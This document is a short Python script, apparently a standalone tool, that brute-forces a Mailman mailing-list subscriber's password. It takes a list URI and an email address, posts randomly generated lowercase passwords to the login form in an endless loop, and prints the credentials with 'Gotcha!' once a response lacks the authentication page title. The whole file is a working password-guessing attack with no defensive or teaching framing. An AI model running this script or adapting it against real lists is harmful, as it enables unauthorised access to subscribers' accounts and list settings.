#!/usr/bin/env python

# IMPORTS
import random
import requests
import argparse

# GLOBALS
plen = 8
pchars = 'abcdefghijklmnopqrstuvwxyz'

# BEGIN EXECUTION
ap = argparse.ArgumentParser(description='Brute force a Mailman listserv')
ap.add_argument('-u', '--uri', dest='uri', type=str, required=True, help='URI of list to brute force')
ap.add_argument('-m', '--mail', dest='mail', type=str, required=True, help='Email address of the subscriber')
ap.add_argument('-l', '--len', dest='plen', type=int, default=8, required=False, help='Length of password in characters')
args = ap.parse_args()

if args.plen:
  plen = args.plen

random.seed()
print('URI: ' + args.uri)
print('Subscriber: ' + args.mail)
print('Password length: ' + str(plen))
print('Character set: ' + pchars)

ii = 0
while True:
  ii += 1
  pw = ''.join(random.sample(pchars, plen)) 
  print(str(ii) + ' ' + pw)

  req = requests.post(args.uri, data=dict(username=args.mail, password=pw))
  if req.status_code == 200:
    if req.text.find("Authentication</title>") == -1:
      print("Gotcha!")
      print('URI: ' + args.uri + ' email:' + args.mail + ' password:' + pw)
      break
  else:
    print('Bad HTTP status_code:' + str(req.status_code))
